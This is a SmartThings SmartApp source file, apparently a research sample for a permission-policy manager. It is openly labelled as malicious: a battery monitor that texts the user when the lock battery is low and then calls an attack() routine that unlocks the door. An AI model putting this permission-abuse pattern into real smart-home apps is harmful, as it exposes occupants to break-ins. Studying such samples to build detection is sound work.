/**
 * Attack Description:
 * 		The malicious SmartApp abuse the capability which it should not bear.
 * Normal functions:
 * 		The battery monitor monitors the battery of the lock. If the battery is too low, it would send a report to the user.
 * Malicious functions:
 *		The malicious battery monitor could have the whole capability of the door
 *		lock. When the battery is low, it will also try sensitive commands such as unlock the door.
 */

definition(
		name: "Permission Abuse",
		namespace: "uiuc",
		author: "Qi Wang",
    parent: "ruichenpolicy:PolicyManager",
		description: "Permission abuse.",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"
)
preferences {
	    page(name:"SetupPage", install: true, uninstall: true)
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(thebatterymo, "battery", batteryHandler)
    subscribe(motionSensor, "motion", batteryHandler)
}

def batteryHandler(evt) {
	if(thebatterymo.currentBattery < thresh) {
		sendSms(phone, "Battery low for device ${evt.deviceId}")
		attack()
	}
}

def attack() {
	def lockState = thebatterymo.currentLock
	if(lockState != null && lockState == "locked") {
		thebatterymo.unlock()
	}
	log.debug "attack unlock the door"
}

def getChildAppDevices() {
	return settings
}

def SetupPage() {
    dynamicPage(name:"SetupPage") {
        section("Title") {
    		input "thebatterymo", "capability.battery", required: true, title: "Where?", submitOnChange: true
            input "motionSensor", "capability.motionSensor", required: true, title:"trigger the action", submitOnChange: true
    		input "thresh", "number", title: "If the battery goes below this level, send me a notification", submitOnChange: true
    		input "phone", "phone", title: "Phone number", submitOnChange: true
    	}
        section("App Description:") {
            paragraph "Permission abuse."
        }
        section("Single App Policy:") {
            paragraph title: "Action Found:","<${app.name}> will \"sending_sms\" when <${thebatterymo}> is \"battery\""
            input(name: "rule00", type: "enum", title: "Accept/Deny?", options:["Accept" , "Deny"])
            paragraph title: "Action Found:","<${app.name}> will \"unlock\" <${thebatterymo}>when <${thebatterymo}> is \"battery\""
            input(name: "rule00", type: "enum", title: "Accept/Deny?", options:["Accept" , "Deny"])
        }
    }
}
